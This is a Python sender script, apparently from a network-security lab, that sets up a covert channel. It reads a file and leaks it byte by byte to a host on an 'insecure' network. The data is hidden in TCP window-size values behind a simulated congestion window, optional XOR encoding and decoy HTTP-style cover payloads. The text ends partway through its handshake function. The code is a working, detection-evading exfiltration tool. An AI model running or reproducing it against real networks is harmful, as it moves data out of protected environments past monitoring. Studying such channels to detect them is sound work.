#!/usr/bin/env python3
import os
import sys
import time
import random
import socket
import struct
import math
from ctypes import *
from array import array

# Constants
DEST_PORT = 8888
SRC_PORT = 8888
PACKET_SIZE = 65535
BUFFER_SIZE = 65535

# Pseudo header for TCP checksum calculation
class PseudoHeader(Structure):
    _fields_ = [
        ("src_addr", c_uint32),
        ("dst_addr", c_uint32),
        ("placeholder", c_uint8),
        ("protocol", c_uint8),
        ("tcp_len", c_uint16)
    ]

class CongestionWindowSimulator:
    """
    Simulates realistic TCP congestion window behavior for the leftmost digits
    while preserving rightmost 3 digits for covert data
    """
    def __init__(self):
        self.cwnd = 10  # Start with 10KB (congestion window in KB)
        self.ssthresh = 64  # Slow start threshold (64KB)
        self.phase = "slow_start"  # "slow_start" or "congestion_avoidance"
        self.packet_count = 0
        self.last_congestion = 0
        self.rtt_estimate = 100  # Estimated RTT in ms
        self.consecutive_acks = 0
        
    def update_on_ack(self, packet_index):
        """Update congestion window when ACK is received"""
        self.packet_count += 1
        self.consecutive_acks += 1
        
        if self.phase == "slow_start":
            # Exponential growth: cwnd += 1 for each ACK
            self.cwnd += 1
            if self.cwnd >= self.ssthresh:
                self.phase = "congestion_avoidance"
                print(f"[CWND] Switched to congestion avoidance at cwnd={self.cwnd}KB")
        else:
            # Linear growth: cwnd += 1/cwnd for each ACK (roughly +1 per RTT)
            self.cwnd += 1.0 / self.cwnd
        
        # Cap at reasonable maximum (65KB for TCP)
        if self.cwnd > 65:
            self.cwnd = 65
            
        # Simulate occasional congestion events (random packet loss)
        if (packet_index - self.last_congestion > 20 and 
            random.random() < 0.05):  # 5% chance of congestion every 20+ packets
            self.simulate_congestion(packet_index)
    
    def update_on_timeout(self, packet_index):
        """Update congestion window when timeout occurs (more severe congestion)"""
        print(f"[CWND] Timeout detected at packet {packet_index}, reducing window")
        self.simulate_congestion(packet_index, severe=True)
        
    def simulate_congestion(self, packet_index, severe=False):
        """Simulate congestion event - reduce window size"""
        if severe:
            # Timeout: reduce to 1 and restart slow start
            print(f"[CWND] Severe congestion (timeout): cwnd {self.cwnd}KB -> 1KB")
            self.ssthresh = max(2, self.cwnd // 2)  # Set new threshold
            self.cwnd = 1
            self.phase = "slow_start"
        else:
            # Fast recovery: cut window in half
            print(f"[CWND] Congestion detected: cwnd {self.cwnd}KB -> {self.cwnd/2}KB")
            self.ssthresh = max(2, self.cwnd // 2)
            self.cwnd = self.ssthresh
            self.phase = "congestion_avoidance"
        
        self.last_congestion = packet_index
        self.consecutive_acks = 0
    
    def get_current_window_base(self):
        """Get current window size base (leftmost digits) in KB"""
        # Round to reasonable values and ensure minimum
        window_kb = max(8, min(65, int(self.cwnd)))
        
        # Add some realistic variation (±10%)
        variation = random.uniform(0.9, 1.1)
        window_kb = int(window_kb * variation)
        
        # Ensure it stays in reasonable bounds
        window_kb = max(8, min(65, window_kb))
        
        return window_kb

# Global congestion window simulator
cwnd_simulator = CongestionWindowSimulator()

def checksum(data):
    """Calculate checksum of the given data"""
    if len(data) % 2 == 1:
        data += b'\0'
    s = sum(array('H', data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    s = ~s
    return socket.ntohs(s & 0xffff)

def get_usec():
    """Get current time in microseconds"""
    return int(time.time() * 1000000)

def send_covert_data(message, dest_ip, src_ip, delay_seconds=0.5, repeat=1, logfile_name="sent_log.csv", cover_file=None, mode='ascii'):
    """
    Send covert data using TCP window size with legitimate cover traffic
    
    Args:
        message (bytes): Covert data to send secretly in window size
        dest_ip (str): Destination IP address
        src_ip (str): Source IP address
        delay_seconds (float): Mean delay between packets
        repeat (int): Number of times to repeat transmission
        logfile_name (str): Log file to write
        cover_file (str): Optional file to send as legitimate cover traffic
        mode (str): Encoding mode ('ascii', 'binary', 'custom', etc.)
    """
    # Create a raw socket for sending
    try:
        send_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except socket.error as e:
        print(f"Error creating send socket: {e}")
        print("Note: This script requires root privileges")
        sys.exit(1)
    
    # Create a raw socket for receiving ACKs
    try:
        recv_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        recv_sock.settimeout(2.0)  # 2 second timeout for ACK reception
    except socket.error as e:
        print(f"Error creating receive socket: {e}")
        send_sock.close()
        sys.exit(1)
    
    # Tell kernel we'll add IP header
    send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    # Additional socket options to prevent kernel interference
    try:
        # Disable automatic TCP RST generation for received packets
        send_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        recv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Set socket buffer sizes
        send_sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
        recv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
    except Exception as e:
        print(f"[!] Warning: Could not set all socket options: {e}")
        print(f"[!] This may cause packet drops, but continuing...")
    
    # Destination address
    dest_addr = (dest_ip, 0)  # Port is in the TCP header
    
    # Load cover data if specified
    cover_data = b""
    if cover_file:
        try:
            with open(cover_file, "rb") as f:
                cover_data = f.read()
            print(f"[+] Loaded {len(cover_data)} bytes of cover data from {cover_file}")
        except Exception as e:
            print(f"[!] Error loading cover file: {e}")
            print(f"[i] Generating dummy cover data instead...")
            # Generate realistic-looking cover data
            cover_data = b"GET /index.html HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0\r\nAccept: text/html\r\n\r\n"
    else:
        # Generate realistic HTTP-like cover traffic
        cover_data = (
            b"POST /api/upload HTTP/1.1\r\n"
            b"Host: secure.example.com\r\n"
            b"Content-Type: application/octet-stream\r\n"
            b"Content-Length: 1024\r\n"
            b"Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9\r\n"
            b"Connection: keep-alive\r\n\r\n"
            b"Binary file data follows..." + b"X" * 950  # Padding to make it look like file upload
        )
    
    # Add EOF marker to covert message
    covert_message = message + b'\x04'  # EOF
    
    print(f"[+] Will send {len(cover_data)} bytes of cover traffic")
    print(f"[+] Will embed {len(covert_message)} bytes of covert data in window sizes")
    print(f"[+] Encoding mode: {mode.upper()}")
    
    # Calculate how to distribute cover data across covert packets
    if len(cover_data) > 0:
        cover_chunk_size = max(1, len(cover_data) // len(covert_message))
        if cover_chunk_size > 1460:  # TCP MSS limit
            cover_chunk_size = 1460
    else:
        cover_chunk_size = 0
    
    # Open log file
    with open(logfile_name, "w") as logfile:
        # Enhanced CSV headers with comprehensive logging
        headers = [
            "run", "packet_index", "timestamp_us", "sequence_num", "ack_num", 
            "original_char", "ascii_value", "encoded_window_size", "window_base", "window_covert",
            "encoding_mode", "initial_seq", "xor_key", "packet_size_bytes", "payload_size_bytes", 
            "tcp_flags", "source_port", "dest_port", "retransmissions", "ack_received", 
            "ack_timeout_ms", "congestion_window", "rtt_estimate_ms", "sender_ip", "receiver_ip",
            "cover_traffic_type", "cover_chunk_start", "cover_chunk_size", "total_delay_ms",
            "checksum_valid", "packet_corruption_detected", "duplicate_acks", "fast_retransmit"
        ]
        logfile.write(",".join(headers) + "\n")
        
        for r in range(1, repeat + 1):
            print(f"\n[=== RUN {r} ===]")
            run_start_usec = get_usec()
            
            # Reset congestion window simulator for new run
            global cwnd_simulator
            cwnd_simulator = CongestionWindowSimulator()
            print(f"[CWND] Reset congestion window simulator for run {r}")
            
            # Use slightly randomized source port to avoid kernel interference
            # Keep destination port fixed but vary source port
            actual_src_port = SRC_PORT + random.randint(0, 10)  # Add small variation
            print(f"[+] Using source port {actual_src_port} (dest port {DEST_PORT})")
            
            # Perform TCP handshake before data transmission
            client_seq, server_seq, initial_seq = perform_tcp_handshake(send_sock, recv_sock, src_ip, dest_ip, actual_src_port)
            
            if client_seq is None:
                print(f"[!] TCP handshake failed for run {r}, skipping...")
                continue
            
            print(f"[+] Starting data transmission with seq={client_seq}")
            if mode == 'xor':
                print(f"[+] XOR mode: Using initial seq {initial_seq} as encoding key")
            elif mode in ['xor1', 'xor2', 'xor3']:
                print(f"[+] {mode.upper()} mode: Using multi-round XOR with initial seq {initial_seq} as encoding key")
            
            for i, char in enumerate(covert_message):
                packet_start_time = time.time()
                packet_start_usec = get_usec()
                seq_num = client_seq + i  # Use proper sequence numbering from handshake
                retransmissions = 0
                ack_received = False
                duplicate_acks = 0
                fast_retransmit = False
                rtt_estimate = 0
                total_delay = 0
                checksum_valid = True
                corruption_detected = False
                
                # Calculate cover data chunk for this packet
                cover_start = (i * cover_chunk_size) % len(cover_data) if cover_data else 0
                cover_end = min(cover_start + cover_chunk_size, len(cover_data)) if cover_data else 0
                
                if cover_data and cover_start < len(cover_data):
                    packet_payload = cover_data[cover_start:cover_end]
                    # Add some variation to make it look more realistic
                    if i % 10 == 0:  # Every 10th packet, add some padding
                        packet_payload += b"\r\n" + b"X" * (i % 50)  # Variable padding
                    cover_type = "file_data"
                else:
                    # No cover data or we've exhausted it - use dummy data
                    dummy_payload = f"DATA_CHUNK_{i:04d}".encode() + b"_" * (50 + (i % 100))
                    packet_payload = dummy_payload[:min(len(dummy_payload), 200)]  # Limit size
                    cover_type = "generated_dummy"
                
                print(f"[+] Packet {i}: covert='{chr(char) if 32 <= char <= 126 else f'0x{char:02x}'}' in window, cover={len(packet_payload)} bytes payload")
                
                while not ack_received and retransmissions < 5:  # Maximum 5 retransmissions before giving up
                    transmission_start = time.time()
                    
                    # Encode window size and get detailed encoding info
                    encoded_window = encode_dynamic_window_size(char, i, mode, initial_seq, seq_num)
                    window_base = (encoded_window // 1000) * 1000
                    window_covert = encoded_window % 1000
                    
                    # Calculate XOR key for logging
                    xor_key = ""
                    if mode in ['xor', 'xor1', 'xor2', 'xor3'] and initial_seq:
                        if mode == 'xor' or mode == 'xor1':
                            xor_key = str(initial_seq % 1000)
                        elif mode == 'xor2':
                            key1 = initial_seq % 1000
                            key2 = (initial_seq // 1000) % 1000
                            xor_key = f"{key1},{key2}"
                        elif mode == 'xor3':
                            key1 = initial_seq % 1000
                            key2 = (initial_seq // 1000) % 1000
                            key3 = (initial_seq // 1000000) % 1000
                            xor_key = f"{key1},{key2},{key3}"
                    
                    # Create data packet using the new packet creation function
                    data_packet = create_tcp_packet(
                        src_ip=src_ip,
                        dest_ip=dest_ip,
                        src_port=actual_src_port,  # Use randomized source port
                        dest_port=DEST_PORT,
                        seq_num=seq_num,
                        ack_num=server_seq,  # ACK the server's sequence number
                        flags=0x18,  # PSH+ACK flags (pushing data)
                        window_size=encoded_window,  # 🔴 COVERT DATA IN WINDOW SIZE! 🔴
                        payload=packet_payload
                    )
                    
                    # DEBUG: Show what we're putting in the window field AND the payload
                    if char == 4:
                        print(f"[DEBUG] seq {seq_num}: window={encoded_window} (EOF marker in {mode} mode), payload={len(packet_payload)} bytes")
                    elif mode == 'ascii' and char >= 32 and char <= 126:
                        print(f"[DEBUG] seq {seq_num}: window={encoded_window} (char='{chr(char)}' in {mode} mode), payload={len(packet_payload)} bytes")
                    elif mode in ['xor', 'xor1', 'xor2', 'xor3']:
                        print(f"[DEBUG] seq {seq_num}: window={encoded_window} (XOR-encoded byte {char} in {mode} mode), payload={len(packet_payload)} bytes")
                    else:
                        print(f"[DEBUG] seq {seq_num}: window={encoded_window} (byte={char} in {mode} mode), payload={len(packet_payload)} bytes")
                    
                    # Send packet
                    send_sock.sendto(data_packet, dest_addr)
                    
                    if retransmissions == 0:
                        if char == 4:
                            print(f"[>] Sent packet: EOF marker (4) in {mode} mode, window {encoded_window}, cover={len(packet_payload)}B - seq {seq_num}")
                        elif mode == 'ascii' and char >= 32 and char <= 126:
                            print(f"[>] Sent packet: covert='{chr(char)}' ({char}) in {mode} mode, window {encoded_window}, cover={len(packet_payload)}B - seq {seq_num}")
                        elif mode in ['xor', 'xor1', 'xor2', 'xor3']:
                            print(f"[>] Sent packet: covert=[0x{char:02x}] in {mode} mode, window {encoded_window}, cover={len(packet_payload)}B - seq {seq_num}")
                        else:
                            print(f"[>] Sent packet: covert=[0x{char:02x}] in {mode} mode, window {encoded_window}, cover={len(packet_payload)}B - seq {seq_num}")
                    else:
                        print(f"[>] Retransmission #{retransmissions} for seq {seq_num}")
                    
                    # Debug: Show packet structure for first few packets
                    if i < 3:  # Only for first 3 packets to avoid spam
                        print(f"[DEBUG] Packet {i}: IP+TCP header size = {len(data_packet) - len(packet_payload)} bytes, payload = {len(packet_payload)} bytes")
                    
                    # Wait for ACK from receiver - increase timeout for later retransmissions
                    # Be more patient in corrupted environment
                    base_timeout = 3.0  # Increased from 2.0 to 3.0 seconds
                    timeout_multiplier = 1.0 + (retransmissions * 0.3)  # Slower exponential backoff
                    ack_timeout = time.time() + (base_timeout * timeout_multiplier)
                    ack_timeout_ms = int((base_timeout * timeout_multiplier) * 1000)
                    ack_attempts = 0
                    max_ack_attempts = 20  # Increased from 15 to 20
                    
                    # Track NACK detection - duplicate ACKs indicate missing packets
                    duplicate_ack_count = 0
                    last_ack_num = None
                    nack_threshold = 3  # Fast retransmit after 3 duplicate ACKs
                    
                    # In corrupted environment, be more patient and check more packets
                    while time.time() < ack_timeout and ack_attempts < max_ack_attempts:
                        try:
                            ack_packet = recv_sock.recvfrom(BUFFER_SIZE)[0]
                            ack_attempts += 1
                            
                            # Extract IP header
                            ip_header_recv = ack_packet[0:20]
                            iph = struct.unpack('!BBHHHBBH4s4s', ip_header_recv)
                            
                            # IP header length
                            ihl = (iph[0] & 0xF)
                            iph_length = ihl * 4
                            
                            # Check protocol
                            protocol = iph[6]
                            if protocol != socket.IPPROTO_TCP:
                                continue
                            
                            # Extract source and destination IP
                            s_addr = socket.inet_ntoa(iph[8])
                            d_addr = socket.inet_ntoa(iph[9])
                            
                            # Only process packets from our receiver
                            if s_addr != dest_ip:
                                continue
                            
                            # Extract TCP header with corruption checking
                            try:
                                tcp_header_recv = ack_packet[iph_length:iph_length+20]
                                if len(tcp_header_recv) < 20:
                                    continue  # Truncated packet
                                    
                                tcph = struct.unpack('!HHLLBBHHH', tcp_header_recv)
                                
                                # TCP header fields - renamed to avoid collision with our seq_num
                                response_src_port = tcph[0]
                                response_dst_port = tcph[1]
                                received_seq = tcph[2]  # RENAMED: this is the received packet's seq, not ours!
                                received_ack = tcph[3]  # RENAMED: this is the ACK number from receiver
                                received_flags = tcph[5]  # RENAMED: avoid collision with flags
                                
                                # Debug: Show what we received - use correct variable names
                                print(f"[ACK DEBUG] Received packet: src_port={response_src_port}, dst_port={response_dst_port}, flags=0x{received_flags:02x}, seq={received_seq}, ack={received_ack}")
                                
                                # Validate TCP header fields
                                if response_src_port == 0 or response_dst_port == 0:
                                    continue  # Invalid ports
                                
                                if received_flags == 0:
                                    continue  # No flags set
                                
                                # Check if this is an ACK for our sequence number
                                # Be more flexible with ACK matching due to potential corruption
                                if (received_flags & 0x10):  # ACK flag set
                                    # Accept ACKs from the correct port with reasonable acknowledgment values
                                    if (response_src_port == DEST_PORT and response_dst_port == actual_src_port):
                                        
                                        # Check if acknowledgment is for OUR sequence number (seq_num is our sent packet's seq)
                                        expected_ack = seq_num + 1  # This is OUR sequence + 1
                                        
                                        if received_ack == expected_ack:
                                            # Perfect match - receiver got this exact packet
                                            print(f"[✓] Received ACK for seq {seq_num} (received ack={received_ack})")
                                            # Update congestion window on successful ACK
                                            cwnd_simulator.update_on_ack(i)
                                            ack_received = True
                                            break
                                        elif received_ack >= expected_ack and received_ack <= expected_ack + 2:
                                            # Small forward ACK - acceptable (reduced tolerance from 15 to 2)
                                            print(f"[✓] Received forward ACK for seq {seq_num} (ack={received_ack}, expected={expected_ack})")
                                            # Update congestion window on successful ACK
                                            cwnd_simulator.update_on_ack(i)
                                            ack_received = True
                                            break
                                        elif abs(received_ack - expected_ack) <= 2:
                                            # Close match, might be corrupted but reasonable (reduced tolerance from 10 to 2)
                                            print(f"[✓] Received approximate ACK for seq {seq_num} (ack={received_ack}, expected={expected_ack})")
                                            # Update congestion window on successful ACK
                                            cwnd_simulator.update_on_ack(i)
                                            ack_received = True
                                            break
                                        elif received_ack < expected_ack:
                                            # Duplicate ACK - potential NACK signal
                                            if last_ack_num == received_ack:
                                                duplicate_ack_count += 1
                                                if duplicate_ack_count >= nack_threshold:
                                                    print(f"[!] NACK detected! Received {duplicate_ack_count} duplicate ACKs for {received_ack}")
                                                    print(f"[!] Fast retransmit triggered for seq {seq_num}")
                                                    # Break out of ACK waiting to trigger immediate retransmission
                                                    break
                                                else:
                                                    print(f"[?] Duplicate ACK #{duplicate_ack_count} for {received_ack} (NACK signal)")
                                            else:
                                                last_ack_num = received_ack
                                                duplicate_ack_count = 1
                                                print(f"[?] Received old ACK {received_ack} (expected ~{expected_ack}) - possible packet loss")
                                        else:
                                            # Log but continue searching - be less verbose in corrupted environment
                                            if ack_attempts % 5 == 0:  # Reduced spam frequency
                                                print(f"[?] Received ACK with unexpected ack_seq {received_ack} (expected ~{expected_ack})")
                                
                            except struct.error:
                                # Corrupted TCP header
                                continue
                            except Exception as e:
                                # Other corruption
                                continue
                                
                        except socket.timeout:
                            break
                        except Exception as e:
                            # Socket error or other issue
                            continue
                    
                    if not ack_received:
                        retransmissions += 1
                        if retransmissions < 5:
                            if duplicate_ack_count >= nack_threshold:
                                print(f"[!] NACK-triggered retransmission #{retransmissions} for seq {seq_num}")
                                # Update congestion window on NACK detection
                                cwnd_simulator.simulate_congestion(i, severe=False)
                                # Reduce delay for NACK-triggered retransmissions
                                time.sleep(0.1)  # 100ms delay for fast retransmit
                            else:
                                print(f"[!] Timeout waiting for ACK for seq {seq_num} (tried {ack_attempts} packets), retransmitting...")
                                # Update congestion window on timeout
                                cwnd_simulator.update_on_timeout(i)
                                # Add small delay before retransmission to give receiver time
                                time.sleep(0.2)  # 200ms delay between retransmissions
                        else:
                            print(f"[!] Max retransmissions (5) reached for seq {seq_num}")
                            # Final desperate attempt with longer timeout
                            print(f"[!] Making final attempt for seq {seq_num} with extended timeout...")
                            
                            # Send one more time
                            send_sock.sendto(data_packet, dest_addr)
                            
                            # Wait much longer for this final ACK
                            final_timeout = time.time() + 5.0  # 5 second timeout
                            final_attempts = 0
                            
                            while time.time() < final_timeout and final_attempts < 20:
                                try:
                                    ack_packet = recv_sock.recvfrom(BUFFER_SIZE)[0]
                                    final_attempts += 1
                                    
                                    # Same ACK processing logic as before
                                    ip_header_recv = ack_packet[0:20]
                                    iph = struct.unpack('!BBHHHBBH4s4s', ip_header_recv)
                                    ihl = (iph[0] & 0xF)
                                    iph_length = ihl * 4
                                    protocol = iph[6]
                                    
                                    if protocol != socket.IPPROTO_TCP:
                                        continue
                                    
                                    s_addr = socket.inet_ntoa(iph[8])
                                    if s_addr != dest_ip:
                                        continue
                                    
                                    try:
                                        tcp_header_recv = ack_packet[iph_length:iph_length+20]
                                        if len(tcp_header_recv) < 20:
                                            continue
                                            
                                        tcph = struct.unpack('!HHLLBBHHH', tcp_header_recv)
                                        response_src_port = tcph[0]  # RENAMED: avoid collision
                                        response_dst_port = tcph[1]  # RENAMED: avoid collision
                                        received_ack = tcph[3]       # RENAMED: this is received ACK
                                        received_flags = tcph[5]     # RENAMED: received flags
                                        
                                        if (received_flags & 0x10) and response_src_port == DEST_PORT and response_dst_port == actual_src_port:
                                            expected_ack = seq_num + 1  # OUR sequence + 1
                                            
                                            if (received_ack == expected_ack or 
                                                abs(received_ack - expected_ack) <= 2):
                                                print(f"[✓] Final attempt successful! Received ACK for seq {seq_num} (ack={received_ack})")
                                                # Update congestion window on successful final ACK
                                                cwnd_simulator.update_on_ack(i)
                                                ack_received = True
                                                break
                                    except:
                                        continue
                                        
                                except socket.timeout:
                                    break
                                except:
                                    continue
                            
                            if not ack_received:
                                print(f"[✗] Final attempt failed for seq {seq_num}, giving up...")
                            
                            # Wait longer before giving up completely in corrupted environment
                            time.sleep(0.5)
                            break
                
                # Track timing and performance metrics
                packet_end_time = time.time()
                total_delay = int((packet_end_time - packet_start_time) * 1000)  # Total delay in ms
                rtt_estimate = int(cwnd_simulator.rtt_estimate)  # RTT estimate in ms
                duplicate_acks = duplicate_ack_count
                fast_retransmit = (duplicate_ack_count >= nack_threshold)
                
                # Set default values for undefined variables
                received_ack = seq_num + 1 if ack_received else 0
                received_flags = "0x10" if ack_received else "0x00"
                cover_chunk_end = cover_end if 'cover_end' in locals() else 0
                
                # Calculate actual packet size
                packet_size_bytes = len(data_packet) if 'data_packet' in locals() else 0
                
                # Create printable character for logging
                original_char = chr(char) if 32 <= char <= 126 else f"\\x{char:02x}"
                
                # Log
                usec = get_usec()
                log_entry = [
                    str(r),                           # run
                    str(i),                           # packet_index  
                    str(usec),                        # timestamp_us
                    str(seq_num),                     # sequence_num
                    str(received_ack),                # ack_num
                    f'"{original_char}"',             # original_char
                    str(char),                        # ascii_value
                    str(encoded_window),              # encoded_window_size
                    str(window_base),                 # window_base
                    str(window_covert),               # window_covert
                    f'"{mode}"',                      # encoding_mode
                    str(initial_seq or ""),           # initial_seq
                    f'"{xor_key}"',                   # xor_key
                    str(packet_size_bytes),           # packet_size_bytes
                    str(len(packet_payload)),         # payload_size_bytes
                    f'"{received_flags}"',            # tcp_flags
                    str(actual_src_port),             # source_port
                    str(DEST_PORT),                   # dest_port
                    str(retransmissions),             # retransmissions
                    str(ack_received).lower(),        # ack_received
                    str(ack_timeout_ms),              # ack_timeout_ms
                    str(int(cwnd_simulator.cwnd)),    # congestion_window
                    str(rtt_estimate),                # rtt_estimate_ms
                    f'"{src_ip}"',                    # sender_ip
                    f'"{dest_ip}"',                   # receiver_ip
                    f'"{cover_type}"',                # cover_traffic_type
                    str(cover_start),                 # cover_chunk_start
                    str(cover_chunk_end),             # cover_chunk_size
                    str(total_delay),                 # total_delay_ms
                    str(checksum_valid).lower(),      # checksum_valid
                    str(corruption_detected).lower(), # packet_corruption_detected
                    str(duplicate_acks),              # duplicate_acks
                    str(fast_retransmit).lower()      # fast_retransmit
                ]
                logfile.write(",".join(log_entry) + "\n")
                
                # Add a small delay before next packet
                if ack_received:
                    time.sleep(0.1)  # Small delay for successful transmission
                else:
                    time.sleep(0.5)  # Longer delay if we gave up on ACK
            
            end_usec = get_usec()
            duration = (end_usec - run_start_usec) / 1000000.0
            throughput = len(covert_message) / duration
            
            print(f"[✔] Run {r} complete: {duration:.2f} seconds, {throughput:.2f} bytes/sec")
    
    send_sock.close()
    recv_sock.close()
    print("[✔] Transmission complete.")

def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <file_to_send> [--delay=0.5] [--repeat=1] [--logfile=sent_log.csv] [--coverfile=cover.bin] [--mode=ascii] [--logdir=logs]")
        print(f"")
        print(f"Modes:")
        print(f"  ascii    - ASCII character encoding (32-126) [DEFAULT]")
        print(f"  xor      - XOR encoding with rightmost 3 digits of initial seq")
        print(f"  xor1     - Single XOR round (same as xor)")
        print(f"  xor2     - Double XOR round (rightmost 3 + next 3 digits)")
        print(f"  xor3     - Triple XOR round (rightmost 3 + next 3 + next 3 digits)")
        print(f"  binary   - Binary encoding (0-255) [FUTURE]")
        print(f"  custom   - Custom encoding scheme [FUTURE]")
        print(f"")
        print(f"Log Management:")
        print(f"  --logdir=<dir>  - Directory for all logs and output files")
        sys.exit(1)
    
    delay_seconds = 0.5
    repeat = 1
    logfile_name = "sent_log.csv"
    cover_file = None
    mode = 'ascii'  # Default mode
    log_directory = None  # No log directory by default
    
    # Parse command line arguments
    for arg in sys.argv[2:]:
        if arg.startswith("--delay="):
            delay_seconds = float(arg[8:])
        elif arg.startswith("--repeat="):
            repeat = int(arg[9:])
        elif arg.startswith("--logfile="):
            logfile_name = arg[10:]
        elif arg.startswith("--coverfile="):
            cover_file = arg[12:]
        elif arg.startswith("--mode="):
            mode = arg[7:].lower()
            print(f"[DEBUG] Parsed mode: '{mode}' from argument '{arg}'")
            if mode not in ['ascii', 'xor', 'xor1', 'xor2', 'xor3', 'random', 'random3']:  # Add XOR variants and random
                print(f"[!] Unsupported mode: {mode}")
                print(f"[!] Supported modes: ascii, xor, xor1, xor2, xor3, random, random3")
                sys.exit(1)
        elif arg.startswith("--logdir="):
            log_directory = arg[9:]
    
    # Create log directory if specified
    if log_directory:
        os.makedirs(log_directory, exist_ok=True)
        # Update logfile path to include directory
        logfile_name = os.path.join(log_directory, logfile_name)
        print(f"[+] Using log directory: {log_directory}")
        print(f"[+] Log file: {logfile_name}")
    
    print(f"[DEBUG] Final mode before send_covert_data: '{mode}'")
    
    # Read the file to send
    try:
        with open(sys.argv[1], "rb") as f:
            message = f.read()
    except Exception as e:
        print(f"Error reading file: {e}")
        sys.exit(1)
    
    # Get IP addresses from environment
    dest_ip = os.getenv('INSECURENET_HOST_IP')
    src_ip = os.getenv('SECURENET_HOST_IP')
    
    if not dest_ip or not src_ip:
        print("ENV INSECURENET_HOST_IP or SECURENET_HOST_IP not set")
        sys.exit(1)
    
    # Send the data
    send_covert_data(message, dest_ip, src_ip, delay_seconds, repeat, logfile_name, cover_file, mode)

def encode_dynamic_window_size(ascii_value, packet_index=0, mode='ascii', initial_seq=None, current_seq=None):
    """
    Encode an ASCII value into a TCP window size using dynamic encoding
    
    Args:
        ascii_value: ASCII character value to encode (0-255)
        packet_index: Current packet index (for pattern variation)
        mode: Encoding mode ('ascii', 'xor', 'xor1', 'xor2', 'xor3', 'random', 'random3')
        initial_seq: Initial sequence number for XOR mode
        current_seq: Current packet sequence number for random XOR mode
        
    Returns:
        Encoded window size
    """
    if mode in ['xor', 'xor1', 'xor2', 'xor3']:
        if initial_seq is None:
            raise ValueError("initial_seq is required for XOR mode")
        return encode_xor_window_size(ascii_value, initial_seq, packet_index, mode)
    elif mode == 'random':
        if current_seq is None:
            raise ValueError("current_seq is required for random XOR mode")
        return encode_xor_window_size(ascii_value, current_seq, packet_index, mode, use_current_seq=True)
    elif mode == 'random3':
        if current_seq is None:
            raise ValueError("current_seq is required for random3 XOR mode")
        return encode_xor_window_size(ascii_value, current_seq, packet_index, mode, use_current_seq=True)
    else:
        # Default to ASCII mode
        return encode_ascii_window_size(ascii_value, packet_index)

def encode_ascii_window_size(ascii_value, packet_index=0):
    """
    Encode ASCII value (32-126) or EOF marker (4) into a realistic-looking window size
    with congestion window simulation for leftmost digits
    
    Args:
        ascii_value: ASCII value to encode (32-126) or EOF marker (4)
        packet_index: Packet sequence for congestion window simulation
        
    Returns:
        Dynamic window size with covert data in last 3 digits and realistic congestion behavior
    """
    global cwnd_simulator
    
    # Special case: EOF marker (4) is allowed as-is
    if ascii_value == 4:
        # For EOF, still use realistic window size but embed 004
        window_base_kb = cwnd_simulator.get_current_window_base()
        return window_base_kb * 1000 + 4  # Embed EOF as 004
    
    # Ensure ASCII value is in valid range for regular characters
    if ascii_value < 32 or ascii_value > 126:
        ascii_value = max(32, min(126, ascii_value))
    
    # Get realistic window base from congestion window simulator
    window_base_kb = cwnd_simulator.get_current_window_base()
    
    # Create window size: leftmost digits from congestion control + rightmost 3 digits from covert data
    encoded_window = window_base_kb * 1000 + ascii_value
    
    # Ensure it doesn't exceed TCP window size limit (65535)
    if encoded_window > 65535:
        # If we exceed limit, use smaller base
        window_base_kb = min(window_base_kb, 65)
        encoded_window = window_base_kb * 1000 + ascii_value
        
        # Final safety check
        if encoded_window > 65535:
            encoded_window = 65000 + ascii_value
    
    print(f"[CWND] Window: {window_base_kb}KB base + covert {ascii_value:03d} = {encoded_window}")
    
    return encoded_window

def decode_dynamic_window_size(window_size):
    """
    Decode ASCII value from the last 3 digits of window size
    
    Args:
        window_size: Encoded window size
        
    Returns:
        Decoded ASCII value
    """
    # Extract last 3 digits
    ascii_value = window_size % 1000
    
    # Validate range - if outside ASCII printable range, might be corrupted
    if ascii_value < 32 or ascii_value > 126:
        # Try to recover or mark as potentially corrupted
        if ascii_value > 126 and ascii_value < 200:
            # Might be extended ASCII, map to printable range
            ascii_value = ((ascii_value - 127) % 95) + 32
        elif ascii_value < 32:
            # Too low, might be corruption - use minimum printable
            ascii_value = 32
        else:
            # Very high value, likely corruption
            ascii_value = 63  # '?' character
    
    return ascii_value

def perform_tcp_handshake(send_sock, recv_sock, src_ip, dest_ip, src_port):
    """
    Perform proper TCP 3-way handshake before data transmission
    
    Args:
        send_sock: Raw socket for sending
        recv_sock: Raw socket for receiving
        src_ip: Source IP address
        dest_ip: Destination IP address
        src_port: Source port
        
    Returns:
        (initial_seq_num, server_seq_num, initial_seq_num) or (None, None, None) if handshake fails
    """
    print(f"[HANDSHAKE] Starting TCP 3-way handshake with {dest_ip}")
    
    # Generate random Initial Sequence Number (ISN) like real TCP
    initial_seq_num = random.randint(1000000, 4000000000)  # Random ISN
    
    # Step 1: Send SYN packet
    print(f"[HANDSHAKE] Step 1/3: Sending SYN with ISN {initial_seq_num}")
    
    # Create SYN packet
    syn_packet = create_tcp_packet(
        src_ip=src_ip,
        dest_ip=dest_ip,
        src_port=src_port,
        dest_port=DEST_PORT,
        seq_num=initial_seq_num,
        ack_num=0,
        flags=0x02,  # SYN flag
        window_size=65535,  # Standard window size for SYN
        payload=b""
    )
    
    # Send SYN
    send_sock.sendto(syn_packet, (dest_ip, 0))
    
    # Step 2: Wait for SYN-ACK
    print(f"[HANDSHAKE] Step 2/3: Waiting for SYN-ACK...")
    
    handshake_timeout = time.time() + 10.0  # 10 second timeout
    server_seq_num = None
    
    while time.time() < handshake_timeout:
        try:
            response_packet = recv_sock.recvfrom(BUFFER_SIZE)[0]
            
            # Parse response packet
            ip_header = response_packet[0:20]
            iph = struct.unpack('!BBHHHBBH4s4s', ip_header)
            ihl = (iph[0] & 0xF) * 4
            
            # Check if it's TCP
            if iph[6] != socket.IPPROTO_TCP:
                continue
            
            # Check source IP
